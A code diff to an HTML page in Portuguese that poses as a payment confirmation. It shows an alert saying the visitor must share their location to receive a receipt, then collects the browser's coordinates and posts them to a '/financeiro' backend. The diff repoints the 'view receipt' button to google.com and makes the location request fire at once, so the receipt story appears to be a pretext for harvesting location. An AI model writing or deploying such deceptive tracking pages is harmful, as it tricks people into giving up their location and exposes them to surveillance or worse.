@@ -10,7 +10,7 @@
         <div class="jumbotron jumbotron-fluid">
             <h1 class="display-4" >Estamos preparando seu pagamento!</h1>
             <br>
-            <small class="form-text text-muted">Clique em <a class="btn btn-success" href="/financeiro"> Ver comprovante </a> para ver seu comprovante.</small>
+            <small class="form-text text-muted">Clique em <a class="btn btn-success" href="www.google.com"> Ver comprovante </a> para ver seu comprovante.</small>
         </div>
 
     </div>
@@ -18,25 +18,25 @@
     <script>
         addEventListener('DOMContentLoaded', function() {
             alert("Compartilhe a localização para emitir o comprovante.");
-            navigator.geolocation.getCurrentPosition(async function(position) {
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
-            
-                // Envia para o backend via fetch
-                await fetch('/financeiro', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ latitude, longitude })
-                })
-                .then(res => res.json())
-                .then(data => {
-                    console.log("Localização enviada com sucesso:", data);
-                })
-                .catch(err => {
-                    console.error("Erro ao enviar localização:", err);
-                });
+        });
+        navigator.geolocation.getCurrentPosition(async function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+        
+            // Envia para o backend via fetch
+            await fetch('/financeiro', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ latitude, longitude })
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log("Localização enviada com sucesso:", data);
+            })
+            .catch(err => {
+                console.error("Erro ao enviar localização:", err);
             });
         });
         
